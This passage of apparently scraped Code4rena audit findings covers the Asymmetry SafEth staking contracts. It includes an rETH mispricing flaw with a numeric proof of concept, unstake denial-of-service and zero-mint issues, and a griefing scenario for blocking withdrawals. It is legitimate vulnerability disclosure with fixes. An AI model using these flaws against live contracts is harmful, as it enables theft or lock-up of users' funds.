public view returns (uint256) {         if (poolCanDeposit(_amount))             return                 RocketTokenRETHInterface(rethAddress()).getEthValue(10 ** 18);         else return (poolPrice() * 10 ** 18) / (10 ** 18);     }  // poolCanDeposit(_amount) return         rocketDepositPool.getBalance() + _amount <=         rocketDAOProtocolSettingsDeposit.getMaximumDepositPoolSize() &&         _amount >= rocketDAOProtocolSettingsDeposit.getMinimumDeposit(); ```  Lets follow what actually happens, for now we have wrong overpriced underlying value of the derivative Reth.  Next the function calculates the preDepositPrice. l will do the real calculations in the POC, but its easy to assume that if the underlyingValue is overpriced the preDepositPrice will be too based on the calculation below.  ```solidity else preDepositPrice = (10 ** 18 * underlyingValue) / totalSupply; ```  // Lets say the user deposits 5e18  Here comes the real problem, so far the function calculates the local variables as there will be swap to Uniswap. As mentioned in the beginning the pool has 100e18 free space, so in the deposit function in Reth, the swap to Uniswap will be ignored as \"poolCanDeposit(msg.value) == true\" and the msg.value will be deposited in the rocket pool.  ```solidity uint256 depositAmount = derivative.deposit{value: ethAmount}(); ``` ```solidity function deposit() external payable onlyOwner returns (uint256) {         // Per RocketPool Docs query addresses each time it is used         address rocketDepositPoolAddress = RocketStorageInterface(             ROCKET_STORAGE_ADDRESS         ).getAddress(                 keccak256(                     abi.encodePacked(\"contract.address\", \"rocketDepositPool\")                 )             );          RocketDepositPoolInterface rocketDepositPool = RocketDepositPoolInterface(                 rocketDepositPoolAddress             );          if (!poolCanDeposit(msg.value)) {             uint rethPerEth = (10 ** 36) / poolPrice();              uint256 minOut = ((((rethPerEth * msg.value) / 10 ** 18) *                 ((10 ** 18 - maxSlippage))) / 10 ** 18);              IWETH(W_ETH_ADDRESS).deposit{value: msg.value}();             uint256 amountSwapped = swapExactInputSingleHop(                 W_ETH_ADDRESS,                 rethAddress(),                 500,                 msg.value,                 minOut             );              return amountSwapped;         } else {             address rocketTokenRETHAddress = RocketStorageInterface(                 ROCKET_STORAGE_ADDRESS             ).getAddress(                     keccak256(                         abi.encodePacked(\"contract.address\", \"rocketTokenRETH\")                     )                 );             RocketTokenRETHInterface rocketTokenRETH = RocketTokenRETHInterface(                 rocketTokenRETHAddress             );             uint256 rethBalance1 = rocketTokenRETH.balanceOf(address(this));             rocketDepositPool.deposit{value: msg.value}();             uint256 rethBalance2 = rocketTokenRETH.balanceOf(address(this));             require(rethBalance2 > rethBalance1, \"No rETH was minted\");             uint256 rethMinted = rethBalance2 - rethBalance1;             return (rethMinted);         }     } ```  Next the function calculates the \"derivativeReceivedEthValue\", this time the function ethPerDerivative(depositAmount) will return the normal price as there is space in the pool. Both \"derivativeReceivedEthValue\" and \"totalStakeValueEth\" will be calculated based on the normal price.  ```solidity uint derivativeReceivedEthValue = (derivative.ethPerDerivative(                 depositAmount             ) * depositAmount) / 10 ** 18; ``` ```solidity totalStakeValueEth += derivativeReceivedEthValue; ```  If we take the info so far and apply it on the mintAmount calculation below, we know that \"totalStakeValueEth\" is calculated on the normal price and \"preDepositPrice\" is calculated on the overpriced pool price. So the user will actually receive less minted shares than he is supposed to get.  ```solidity uint256 mintAmount = (totalStakeValueEth * 10 ** 18) / preDepositPrice; ```   ## Proof of Concept - Part 1  Will start from the start in order to get the right amounts of \"totalSupply\" and the Reth balance of derivative. So l can show the issue result in POC Part 2.  // The values below are only made for the example.  Let's say we have two stakers - Bob and Kiki each depositing 100e18. We have only one derivative which is Reth, so it will have 100% weight.  Bob deposits 100e18 as the first depositer and receives (99999999999999999932) minted tokens of safETH.  So far after Bob deposit:  totalSupply = 99999999999999999932  Reth derivative balance = 93988463204618701706  ```solidity uint256 underlyingValue = 0; uint256 totalSupply = 0;  uint256 preDepositPrice = 1e18  // As we have only derivative Reth in the example, it owns all of the weight. uint256 ethAmount = (msg.value * weight) / totalWeight; uint256 ethAmount = (100e18 * 1000) / 1000;  // not applying the deposit fee in rocketPool  uint256 depositAmount = derivative.deposit{value: ethAmount}(); uint256 depositAmount = 93988463204618701706  uint derivativeReceivedEthValue = (derivative.ethPerDerivative(depositAmount) * depositAmount) / 10 ** 18; uint derivativeReceivedEthValue = (1063960369075232250 * 93988463204618701706) / 10 ** 18; uint derivativeReceivedEthValue = 99999999999999999932  totalStakeValueEth = 99999999999999999932;    uint256 mintAmount = (totalStakeValueEth * 10 ** 18) / preDepositPrice; uint256 mintAmount = (99999999999999999932 * 10 ** 18) / 1e18; uint256 mintAmount = 99999999999999999932 ```  Kiki deposits 100e18 as well and receives (99999999999999999932) minted tokens of safEth.  So far after Kiki's deposit:  totalSupply = 199999999999999999864;  Reth derivative balance = 187976926409237403412;   ```solidity // take the info after bob's deposit and the normal price underlyingValue  = (derivatives[i].ethPerDerivative(derivatives[i].balance()) * derivatives[i].balance()) / 10 ** 18; uint256 underlyingValue = (1063960369075232250 * 93988463204618701706) / 10 ** 18; uint256 underlyingValue = 99999999999999999932;  uint256 totalSupply = 99999999999999999932;   uint256 preDepositPrice = (10 ** 18 * underlyingValue) / totalSupply; uint256 preDepositPrice = (10 ** 18 * 99999999999999999932) / 99999999999999999932; uint256 preDepositPrice = 1e18;   // As we have only derivative Reth in the example, it owns all of the weight. uint256 ethAmount = (msg.value * weight) / totalWeight; uint256 ethAmount = (100e18 * 1000) / 1000;  // not applying the deposit fee in rocketPool uint256 depositAmount = 93988463204618701706  uint derivativeReceivedEthValue = (derivative.ethPerDerivative(depositAmount) * depositAmount) / 10 ** 18; uint derivativeReceivedEthValue = (1063960369075232250 * 93988463204618701706) / 10 ** 18; uint derivativeReceivedEthValue = 99999999999999999932  totalStakeValueEth = 99999999999999999932;   uint256 mintAmount = (totalStakeValueEth * 10 ** 18) / preDepositPrice; uint256 mintAmount = (99999999999999999932 * 10 ** 18) / 1e18; uint256 mintAmount = 99999999999999999932 ```  ## Proof of Concept - Part 2  From the first POC, we calculated the outcome of 200e18 staked into the Reth derivative. We got the totalSupply and the Reth balance the derivative holds. So we can move onto the main POC, where l can show the difference and how much less minted tokens the user gets.  ``` totalSupply = 199999999999999999864; Reth derivative balance = 187976926409237403412; ```  First l am going to show how much minted tokens the user is supposed to get without applying the issue occurring. And after that l will do the second one and apply the issue. So we can compare the outcomes and see how much less minted tokens the user gets.  Without the issue occurring, a user deposits 5e18 by calling the staking function. The user received (4999549277935239332) minted tokens of safEth.  ```solidity uint256 underlyingValue  = (derivatives[i].ethPerDerivative(derivatives[i].balance()) * derivatives[i].balance()) / 10 ** 18; uint256 underlyingValue  = (1063960369075232250 * 187976926409237403412) / 10 ** 18; uint256 underlyingValue  = 199999999999999999864;   uint256 totalSupply = 199999999999999999864;   uint256 preDepositPrice = (10 ** 18 * underlyingValue) / totalSupply; uint256 preDepositPrice = (10 ** 18 * 199999999999999999864) / 199999999999999999864; uint256 preDepositPrice = 1e18;  // As we have only derivative Reth in the example, it owns all of the weight. uint256 ethAmount = (msg.value * weight) / totalWeight; uint256 ethAmount = (5e18 * 1000) / 1000;  // not applying the deposit fee in rocketPool uint256 depositAmount = 4698999533488942411  uint derivativeReceivedEthValue = (derivative.ethPerDerivative(depositAmount) * depositAmount) / 10 ** 18; uint derivativeReceivedEthValue = (1063960369075232250 * 4698999533488942411) / 10 ** 18; uint derivativeReceivedEthValue = 4999549277935239332  totalStakeValueEth = 4999549277935239332;   uint256 mintAmount = (totalStakeValueEth * 10 ** 18) / preDepositPrice; uint256 mintAmount = (4999549277935239332 * 10 ** 18) / 1e18; uint256 mintAmount = 4999549277935239332 ```  Stats after the deposit without the issue:  ``` totalSupply = 204999549277935239196 Reth derivative balance = 192675925942726345823; ```  This time we apply the issue occurring and as the first one a user deposits 5e18 by calling the staking function. The user receives (4973574036557377784) minted tokens of saEth  ```solidity uint256 underlyingValue  = (derivatives[i].ethPerDerivative(derivatives[i].balance()) * derivatives[i].balance()) / 10 ** 18; // the function takes as account the pool price here which is overpriced. uint256 underlyingValue  = (1069517062752670179 * 187976926409237403412) / 10 ** 18; uint256 underlyingValue  = 201044530198482424206  uint256 totalSupply = 199999999999999999864;  uint256 preDepositPrice = (10 ** 18 * underlyingValue) / totalSupply; uint256 preDepositPrice = (10 ** 18 * 201044530198482424206) / 199999999999999999864; uint256 preDepositPrice = 1005222650992412121;  // As we have only derivative Reth in the example, it owns all of the weight. uint256 ethAmount = (msg.value * weight) / totalWeight; uint256 ethAmount = (5e18 * 1000) / 1000;  // not applying the deposit fee in rocketPool uint256 depositAmount = 4698999533488942411  // Here the function calculates based on the normal price, as the pool has free space and the user deposits only 5e18. uint derivativeReceivedEthValue = (derivative.ethPerDerivative(depositAmount) * depositAmount) / 10 ** 18; uint derivativeReceivedEthValue = (1063960369075232250 * 4698999533488942411) / 10 ** 18; uint derivativeReceivedEthValue = 4999549277935239332  totalStakeValueEth = 4999549277935239332;   uint256 mintAmount = (totalStakeValueEth * 10 ** 18) / preDepositPrice; uint256 mintAmount = (4999549277935239332 * 10 ** 18) / 1005222650992412121; uint256 mintAmount = 4973574036557377784 ```  Stats after the deposit with the issue: ``` totalSupply = 204973574036557377648; Reth derivative balance = 192675925942726345823; ```  Difference between outcomes:  ``` Without the issue based on 5e18 deposit, the user receives -        4999549277935239332 minted tokens With the issue occurring based on 5e18 deposit, the user receives - 4973574036557377784 minted tokens ```  ## Proof of Concept - Plus  So far we found that this issue leads to users receiving less minted shares, but let's go even further and see how much the user losses in terms of ETH. By unstaking the minted amount.  First we apply the stats without the issue occurring.  ``` totalSupply = 204999549277935239196 Reth derivative balance = 192675925942726345823; ```  ```solidity uint256 derivativeAmount = (derivatives[i].balance() * _safEthAmount) / safEthTotalSupply; uint256 derivativeAmount = (192675925942726345823 * 4999549277935239332) / 204999549277935239196; uint256 derivativeAmount = 4698999533488942410;  // Eth value based on the current eth price // Reth to Eth value - 4698999533488942410 => 4.999999999999999998 - 8766.85 usd  ```  Second we apply the stats with the issue occurring.  ``` totalSupply = 204973574036557377648; Reth derivative balance = 192675925942726345823; ``` ```solidity uint256 derivativeAmount = (derivatives[i].balance() * _safEthAmount) / safEthTotalSupply; uint256 derivativeAmount = (192675925942726345823 * 4973574036557377784) / 204973574036557377648; uint256 derivativeAmount = 4675178189396666336;  // Eth value based on the current eth price // Reth to Eth value - 4675178189396666336 => 4.974637740558436705 - 8722.41 usd  ```  ## Tools Used Manual review  ## Recommended Mitigation Steps The problem occurs with calculating the underlyingValue in the staking function. The function \"ethPerDerivative\" is called with all of the Reth balance, which should not be the case here. Therefore the function calls \"poolCanDeposit\" in order to check if the pool has space for the Reth derivative balance (Basically the contract thinks that the Reth balance in the derivative will be deposited in the pool, which is not the case here). So even if the pool has space for the depositing amount by the user, the poolCanDeposit(_amount) will return false and the contract will get the poolPrice of the reth which is supposed to be used only for the swap in Uniswap. The contract process executing the staking function with the overpriced pool price and doesn't perform any swap, but deposits the user funds to the pool.  ```solidity underlyingValue +=                 (derivatives[i].ethPerDerivative(derivatives[i].balance()) *                     derivatives[i].balance()) /                 10 ** 18; ``` ```solidity function ethPerDerivative(uint256 _amount) public view returns (uint256) {         if (poolCanDeposit(_amount))             return                 RocketTokenRETHInterface(rethAddress()).getEthValue(10 ** 18);         else return (poolPrice() * 10 ** 18) / (10 ** 18);     } ``` ```solidity return         rocketDepositPool.getBalance() + _amount <=         rocketDAOProtocolSettingsDeposit.getMaximumDepositPoolSize() &&         _amount >= rocketDAOProtocolSettingsDeposit.getMinimumDeposit(); ```  l'd recommend creating a new function in the reth derivative contract. Which converts the msg.value to reth tokens and using it instead of the whole Reth balance the derivative holds.  ```solidity function rethValue(uint256 _amount) public view returns (uint256) {       RocketTokenRETHInterface(rethAddress()).getRethValue(amount);     } ```  Like this we check if the msg.value converted into reth tokens is below the maximumPoolDepositSize and greater than the minimum deposit.  ```solidity underlyingValue +=                 (derivatives[i].ethPerDerivative(derivatives[i].rethValue(msg.value)) *                     derivatives[i].balance()) /                 10 ** 18; ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/995", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-10"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/lukris02-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/990", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-11"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/KrisApostolov-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/983", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-11"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/KrisApostolov-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/977", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-02"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/Udsen-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/975", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-13"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/Haipls-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/967", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "selected for report", "sponsor confirmed", "Q-25"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/brgltd-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/944", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-27"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/Josiah-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/940", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-28"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/helios-Q.md)."}, {"title": "Possible loss of funds on staking", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/937", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-b", "primary issue", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-29"], "target": "2023-03-asymmetry-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L98-L99   # Vulnerability details    ## Impact  A staker will lose funds because he didn't receive back an amount of SafEth ERC20 tokens.  ## Proof of Concept At `stake()` function code line [L98](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L98) The `mintAmount` calculated by: ``` uint256 mintAmount = (totalStakeValueEth * 10 ** 18) / preDepositPrice; ``` which it might cause the **mintAmount** to be zero. Because at some cases we would have `(totalStakeValueEth * 10 ** 18)` less than `preDepositPrice` \"*in solidity the result is zero because a number is divided by a bigger number.*\"  if you look closely you will see that   `_mint(msg.sender, mintAmount);`   doesn't check if **mintAmount greater than zero** so it will always pass successfully.   According to last math above a staker calls stake() function and his Eth amount goes to SafEth contract without having any of  **SafEth ERC20 token** back. so he will not be able to unstake because he doesn't have SafEth tokens to burn and lose his funds.    ## Tools Used Manual Review  ## Recommended Mitigation Steps Check if the `mintAmount` greater than zero: add this line before _mint line call `require(mintAmount > 0, \"can't stake for now\");`"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/869", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-40"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/lukris02-Q.md)."}, {"title": "The user could possibly burn their safETH tokens and still receive 0 ETH on unstaking", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/836", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-b", "primary issue", "QA (Quality Assurance)", "sponsor confirmed", "Q-44"], "target": "2023-03-asymmetry-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L120   # Vulnerability details  ## Impact To unstake your safETH into ETH, one should call `SafEth.unstake()` method, passing the amount to be unstaked `_safEthAmount`. This is done as follows: 1. Withdraw a percentage of each asset based on the amount of safETH ```solidity uint256 derivativeAmount = (derivatives[i].balance() *                 _safEthAmount) / safEthTotalSupply; ``` 2. Burn _safEthAmount of safETH token  ```solidity  _burn(msg.sender, _safEthAmount); ``` 3. Send the `ethAmountToWithdraw` to the user (msg.sender).  However, there is no check if `ethAmountToWithdraw` greater than zero. In case the `ethAmountToWithdraw` is zero, the user receives nothing even though his/her safETH tokens were burnt.  This could happen if the `derivativeAmount` (of all derivatives) equals zero because the  `_safEthAmount` or `derivatives[i].balance()` is too small (especially for early stakers). Thus, nothing is withdrawn from the derivative  ```solidity    if (derivativeAmount == 0) continue; // if derivative empty ignore ```  Now, in case only one derivative's `derivativeAmount` equals zero, then the user will receive ETH less than what he/she is supposed to receive which is unfair.    ## Proof of Concept  Please check above   ## Tools Used Manual analysis  ## Recommended Mitigation Steps   - Consider adding a check if the `ethAmountToWithdraw` is zero, then revert. This will protect the user from receiving nothing while still burning their safETH tokens.  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/817", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-48"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/Jerry0x-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/782", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "edited-by-warden", "G-17"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/mahdirostami-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/768", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-20"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/Madalad-G.md)."}, {"title": "Users can fail to unstake and lose their deserved ETH because malfunctioning or untrusted derivative cannot be removed", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/703", "labels": ["bug", "3 (High Risk)", "high quality report", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-03"], "target": "2023-03-asymmetry-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L165-L175 https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L108-L129 https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L56-L67 https://etherscan.io/address/0xDC24316b9AE028F1497c275EB9192a3Ea0f67022#code#L441   # Vulnerability details  ## Impact Calling the following `SafEth.adjustWeight` function can update the weight for an existing derivative to 0. However, there is no way to remove an existing derivative. If the external contracts that an existing derivative depends on malfunction or get hacked, this protocol's functionalities that need to loop through the existing derivatives can behave unexpectedly. Users can fail to unstake and lose their deserved ETH as one of the severest consequences.  https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L165-L175 ```solidity     function adjustWeight(         uint256 _derivativeIndex,         uint256 _weight     ) external onlyOwner {         weights[_derivativeIndex] = _weight;         uint256 localTotalWeight = 0;         for (uint256 i = 0; i < derivativeCount; i++)             localTotalWeight += weights[i];         totalWeight = localTotalWeight;         emit WeightChange(_derivativeIndex, _weight);     } ```  For example, calling the following `SafEth.unstake` function would loop through all of the existing derivatives and call the corresponding derivative's `withdraw` function. When the `WstEth` contract is one of these derivatives, the `WstEth.withdraw` function would be called, which further calls `IStEthEthPool(LIDO_CRV_POOL).exchange(1, 0, stEthBal, minOut)`. If `self.is_killed` in the stETH-ETH pool contract corresponding to `LIDO_CRV_POOL` becomes true, especially after such pool contract becomes compromised or hacked, calling such `exchange` function would always revert. In this case, calling the `SafEth.unstake` function reverts even though all other derivatives that are not the `WstEth` contract are still working fine. Because the `SafEth.unstake` function is DOS'ed, users cannot unstake and withdraw ETH that they are entitled to.  https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L108-L129 ```solidity     function unstake(uint256 _safEthAmount) external {         require(pauseUnstaking == false, \"unstaking is paused\");         uint256 safEthTotalSupply = totalSupply();         uint256 ethAmountBefore = address(this).balance;          for (uint256 i = 0; i < derivativeCount; i++) {             // withdraw a percentage of each asset based on the amount of safETH             uint256 derivativeAmount = (derivatives[i].balance() *                 _safEthAmount) / safEthTotalSupply;             if (derivativeAmount == 0) continue; // if derivative empty ignore             derivatives[i].withdraw(derivativeAmount);         }         ...     } ```  https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L56-L67 ```solidity     function withdraw(uint256 _amount) external onlyOwner {         IWStETH(WST_ETH).unwrap(_amount);         uint256 stEthBal = IERC20(STETH_TOKEN).balanceOf(address(this));         IERC20(STETH_TOKEN).approve(LIDO_CRV_POOL, stEthBal);         uint256 minOut = (stEthBal * (10 ** 18 - maxSlippage)) / 10 ** 18;         IStEthEthPool(LIDO_CRV_POOL).exchange(1, 0, stEthBal, minOut);         ...     } ```  https://etherscan.io/address/0xDC24316b9AE028F1497c275EB9192a3Ea0f67022#code#L441 ```solidity def exchange(i: int128, j: int128, dx: uint256, min_dy: uint256) -> uint256:     ...     assert not self.is_killed  # dev: is killed ```  ## Proof of Concept The following steps can occur for the described scenario. 1. The `WstEth` contract is one of the existing derivatives. For the `WstEth` contract, the stETH-ETH pool contract corresponding to `LIDO_CRV_POOL` has been hacked in which its `self.is_killed` has been set to true. 2. Alice calls the `SafEth.unstake` function but such function call reverts because calling the stETH-ETH pool contract's `exchange` function reverts for the `WstEth` derivative. 3. Although all other derivatives that are not the `WstEth` contract are still working fine, Alice is unable to unstake. As a result, she cannot withdraw and loses her deserved ETH.  ## Tools Used VSCode  ## Recommended Mitigation Steps The `SafEth` contract can be updated to add a function, which would be only callable by the trusted admin, for removing an existing derivative that already malfunctions or is untrusted."}, {"title": "Possible DoS on `unstake()`", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/685", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-08"], "target": "2023-03-asymmetry-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L107-L114   # Vulnerability details  ## Impact RocketPool rETH tokens have a [deposit delay](https://github.com/rocket-pool/rocketpool/blob/967e4d3c32721a84694921751920af313d1467af/contracts/contract/token/RocketTokenRETH.sol#L157-L172) that prevents any user who has recently deposited to transfer or burn tokens. In the past this delay was set to 5760 blocks mined (aprox. 19h, considering one block per 12s). This delay can prevent asymmetry protocol users from unstaking if another user staked recently.  While it's not currently possible due to RocketPool's configuration, any future changes made to this delay by the admins could potentially lead to a denial-of-service attack on the `\u00f9nstake()` mechanism. This is a major functionality of the asymmetry protocol, and therefore, it should be classified as a high severity issue.  ## Proof of Concept Currently, the delay is set to zero, but if RocketPool admins decide to change this value in the future, it could cause issues. Specifically, protocol users staking actions could prevent other users from unstaking for a few hours. Given that many users call the stake function throughout the day, the delay would constantly reset, making the unstaking mechanism unusable. It's important to note that this only occurs when `stake()` is used through the `rocketDepositPool` route. If rETH is obtained from the Uniswap pool, the delay is not affected.  A malicious actor can also exploit this to be able to block all `unstake` calls. Consider the following scenario where the delay was raised again to 5760 blocks. Bob (malicious actor) call `stakes()` with the minimum amount, consequently triggering deposit to RocketPool and resetting the deposit delay. Alice tries to `unstake` her funds, but during rETH burn, it fails due to the delay check, reverting the `unstake` call.  If Bob manages to repeatedly `stakes()` the minimum amount every 19h (or any other interval less then the deposit delay), all future calls to `unstake` will revert.  ## Tools Used Manual Review  ## Recommended Mitigation Steps Consider modifying Reth derivative to obtain rETH only through the UniswapV3 pool, on average users will get less rETH due to the slippage, but will avoid any future issues with the deposit delay mechanism."}, {"title": "Non-ideal rETH/WETH pool used pays unnecessary fees", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/673", "labels": ["bug", "2 (Med Risk)", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "M-09"], "target": "2023-03-asymmetry-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L101   # Vulnerability details  ## Impact  rETH is acquired using the Uniswap rETH/WETH pool. This solution has higher fees and lower liquidity than alternatives, which results in more lost user value than other solutions.  The Uniswap rETH/WETH pool that is used in Reth.sol to make swaps has a liquidity of $5 million. In comparison, the Balancer rETH/WETH pool has a liquidity of $80 million. Even the Curve rETH/WETH pool has a liquidity of $8 million. The greater liquidity should normally offer lower slippage to users. In addition, the fees to swap with the Balancer pool are only 0.04% compared to Uniswap's 0.05%. Even the Curve pool offers a lower fee than Uniswap with just a 0.037% fee. [This Dune Analytics dashboard](https://dune.com/drworm/rocketpool) shows that Balancer is where the majority of rETH swaps happen by volume.  One solution to finding the best swap path for rETH is to use RocketPool's [RocketSwapRouter.sol contract `swapTo()` function](https://etherscan.io/address/0x16d5a408e807db8ef7c578279beeee6b228f1c1c#code#F19#L64). When users visit the RocketPool frontend to swap ETH for rETH, this is the function that RocketPool calls for the user. RocketSwapRouter.sol automatically determines the best way to split the swap between Balancer and Uniswap pools.  ## Proof of Concept  Pools that can be used for rETH/WETH swapping: - [Uniswap rETH/WETH pool](https://etherscan.io/address/0xa4e0faA58465A2D369aa21B3e42d43374c6F9613): $5 million in liquidity - [Balancer rETH/WETH pool](https://app.balancer.fi/#/ethereum/pool/0x1e19cf2d73a72ef1332c882f20534b6519be0276000200000000000000000112) - [Curve Finance rETH/ETH pool](https://curve.fi/#/ethereum/pools/factory-crypto-210/deposit): $8 million in liquidity  [Line where Reth.sol swaps WETH for rETH](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L101) with the Uniswap rETH/WETH pool.  ## Tools Used  Etherscan, Dune Analytics  ## Recommended Mitigation Steps  The best solution is to use the same flow as RocketPool's frontend UI and to call `swapTo()` in [RocketSwapRouter.sol](https://etherscan.io/address/0x16d5a408e807db8ef7c578279beeee6b228f1c1c#code#F19#L64). An alternative is to modify Reth.sol to use the Balancer rETH/ETH pool for swapping instead of Uniswap's rETH/WETH pool to better conserve user value by reducing swap fees and reducing slippage costs."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/667", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-65"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/Bason-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/654", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-73"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/0xRajkumar-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/611", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-70"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/inmarelibero-Q.md)."}, {"title": "`WstEth` derivative assumes a ~1=1 peg of stETH to ETH", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/588", "labels": ["bug", "3 (High Risk)", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "H-06"], "target": "2023-03-asymmetry-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L86-L88 https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L56-L67   # Vulnerability details  ## Impact  The `WstEth` contract implements the ETH derivative for the Lido protocol. The stETH token is the liquid representation of the ETH staked in this protocol.  There are two different places in the codebase that indicate that the implementation is assuming a peg of 1 ETH ~= 1 stETH, each with different consequences. Even though both tokens have a tendency to keep the peg, this hasn't been always the case as it can be seen in [this 